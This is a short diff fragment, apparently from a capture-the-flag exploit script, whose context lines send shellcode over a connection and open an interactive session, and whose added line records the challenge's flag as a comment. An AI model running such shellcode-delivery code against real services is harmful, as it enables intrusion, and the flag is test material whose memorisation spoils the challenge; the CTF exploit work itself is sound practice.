@@ -36,3 +36,4 @@ log.info(len(shellcode))
 sleep(1)
 r.send(shellcode)
 r.interactive()
+#flag{indeed_there_will_be_no_future_without_risc}
